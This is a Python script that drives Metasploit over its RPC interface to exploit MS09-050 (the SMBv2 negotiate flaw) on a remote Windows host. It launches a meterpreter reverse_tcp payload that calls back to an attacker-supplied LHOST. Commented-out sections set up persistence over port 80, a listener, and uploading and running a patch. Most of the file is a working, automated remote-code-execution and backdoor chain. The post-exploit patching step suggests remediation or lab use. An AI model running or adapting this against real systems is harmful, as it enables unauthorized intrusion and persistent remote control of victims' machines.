#!/usr/bin/env python3
import os
import sys
import argparse
from time import sleep
from pymetasploit3.msfrpc import MsfRpcClient

# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
    with open('/tmp/smbpost.rc', 'w') as post:
        with open('/tmp/ms09050_install.bat', 'w') as bat:
            postcomms = f"""getsystem
run persistence -S -U -X -i 10 -p 80 -r {LHOST}
cd c:\
upload /tmp/ms09050_patch.exe c:\
upload /tmp/ms09050_install.bat c:\
execute -f ms09050_install.bat
"""
            batcomm = "ms09050_patch.exe /quiet"
            # Optionally write to the files if needed
            # post.write(postcomms)
            # bat.write(batcomm)

# Sets up the chain of rc files to exploit MS09-050, setup persistence, and patch
def sploiter(RHOST, LHOST, LPORT, session):
    # Connect to Metasploit RPC using pymetasploit3
    #client = MsfRpcClient('abc123', ssl=True)  # Replace 'abc123' with your actual RPC password
    client = MsfRpcClient('abc123', server='127.0.0.1', port=55552)  # Replace 'abc123' with your actual RPC password

    # Create a new console
    console = client.consoles.console()

    # Exploit MS09-050
    commands = f"""use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST {RHOST}
set LHOST {LHOST}
set LPORT {LPORT}
set ExitOnSession false
exploit -z
"""
    print(f"[+] Exploiting MS09-050 on: {RHOST}")
    console.write(commands)

    # Wait for the exploitation process to finish
    while True:
        res = console.read()
        if res['busy']:
            sleep(1)
            continue
        print(res['data'])  # Print the console output
        break

    # Optional: Run post-exploit script (commented out)
    # runPost = f"""use post/multi/gather/run_console_rc_file
    # set RESOURCE /tmp/smbpost.rc
    # set SESSION {session}
    # exploit
    # """
    # print(f"[+] Running post-exploit script on: {RHOST}")
    # console.write(runPost)
    # while True:
    #     rres = console.read()
    #     if rres['busy']:
    #         sleep(1)
    #         continue
    #     print(rres['data'])
    #     break

    # Optional: Setup listener for a persistent connection back over port 80 (commented out)
    # sleep(10)
    # listen = f"""use exploit/multi/handler
    # set PAYLOAD windows/meterpreter/reverse_tcp
    # set LPORT 80
    # set LHOST {LHOST}
    # exploit
    # """
    # print(f"[+] Setting up listener on: {LHOST}:80")
    # console.write(listen)
    # while True:
    #     lres = console.read()
    #     if lres['busy']:
    #         sleep(1)
    #         continue
    #     print(lres['data'])
    #     break

def main():
    parser = argparse.ArgumentParser(description='MSF Automation Script')
    parser.add_argument('-p', dest='LPORT', type=str, 
                        help='Specify a port to listen on')
    parser.add_argument('-r', dest='RHOST', type=str, 
                        help='Specify a remote host')
    parser.add_argument('-l', dest='LHOST', type=str, 
                        help='Specify a local host')
    parser.add_argument('-s', dest='session', type=str, 
                        help='Specify a session ID')

    args = parser.parse_args()
    session = args.session
    RHOST = args.RHOST
    LHOST = args.LHOST
    LPORT = args.LPORT

    if RHOST is None or LPORT is None or LHOST is None:
        print(parser.print_usage())
        sys.exit(0)

    #builder(RHOST, LHOST, LPORT)
    sploiter(RHOST, LHOST, LPORT, session)

if __name__ == "__main__":
    main()
